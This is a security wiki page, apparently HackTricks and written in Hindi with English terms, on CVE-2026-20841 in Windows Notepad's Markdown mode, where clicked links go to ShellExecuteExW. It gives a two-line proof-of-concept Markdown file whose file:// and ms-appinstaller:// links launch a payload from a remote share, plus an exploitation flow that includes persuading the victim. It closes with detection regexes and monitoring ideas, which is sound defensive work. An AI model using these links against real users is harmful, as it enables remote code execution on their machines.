# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Windows applications जो Markdown या HTML render करती हैं, clicked targets को `ShellExecuteExW` को सौंप सकती हैं। क्योंकि ShellExecute registered URI schemes और file associations को dispatch करता है, इसलिए renderer को यह मानने के बजाय कि हर link HTTP(S) है, एक स्पष्ट allowlist का उपयोग करना चाहिए। नीचे दिया गया Notepad behavior CVE-2026-20841 का वर्णन करता है और इसे हर renderer पर सामान्यीकृत नहीं किया जाना चाहिए।<sup>[[1]](#references)[[3]](#references)</sup>

## Windows Notepad Markdown mode में ShellExecuteExW surface
- Notepad Markdown mode को **केवल `.md` extensions** के लिए `sub_1400ED5D0()` में fixed string comparison के माध्यम से चुनता है।<sup>[[1]](#references)</sup>
- Supported Markdown links:
- Standard: `[text](target)`
- Autolink: `<target>` (जिसे `[target](target)` के रूप में render किया जाता है), इसलिए payloads और detections के लिए दोनों syntaxes महत्वपूर्ण हैं।
- Link clicks को `sub_140170F60()` में process किया जाता है, जो weak filtering करता है और फिर `ShellExecuteExW` को call करता है।
- `ShellExecuteExW` केवल HTTP(S) ही नहीं, बल्कि **किसी भी configured protocol handler** को dispatch करता है।<sup>[[1]](#references)</sup>

### Payload considerations
- Link में मौजूद कोई भी `\\` sequence `ShellExecuteExW` से पहले `\` में **normalize** किया जाता है, जिससे UNC/path crafting और detection प्रभावित होते हैं।
- `.md` files default रूप से Notepad के साथ **associated नहीं होतीं**; victim को file को Notepad में खोलकर link पर click करना अभी भी आवश्यक है, लेकिन render होने के बाद link clickable होता है।
- Dangerous example schemes:<sup>[[1]](#references)</sup>
- `file://` local/UNC payload launch करने के लिए।
- `ms-appinstaller://` App Installer flows trigger करने के लिए। अन्य locally registered schemes का भी abusable होना संभव है।

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Exploitation flow
1. एक **`.md` file** तैयार करें ताकि Notepad इसे Markdown के रूप में render करे।
2. एक dangerous URI scheme (`file:`, `ms-appinstaller:`, या कोई भी installed handler) का उपयोग करके link embed करें।
3. File को (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB या समान माध्यम से) deliver करें और user को इसे Notepad में open करने के लिए convince करें।
4. Click करने पर, **normalized link** `ShellExecuteExW` को hand off किया जाता है और संबंधित protocol handler user के context में referenced content को execute करता है।<sup>[[1]](#references)[[2]](#references)</sup>

## Detection ideas
- `.md` files को उन ports/protocols पर transfer किए जाने की monitoring करें जो आमतौर पर documents deliver करते हैं: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Markdown links (standard और autolink) को parse करें और **case-insensitive** `file:` या `ms-appinstaller:` खोजें।
- Remote resource access को पकड़ने के लिए vendor-guided regexes:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- ZDI द्वारा वर्णित vendor fix स्वीकृत targets को local files और HTTP(S) तक सीमित करता है। Registered attack surface system के अनुसार अलग होता है, इसलिए आवश्यकतानुसार अन्य installed protocol handlers के लिए भी detections विस्तारित करें।<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Windows Notepad में Arbitrary Code Execution](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
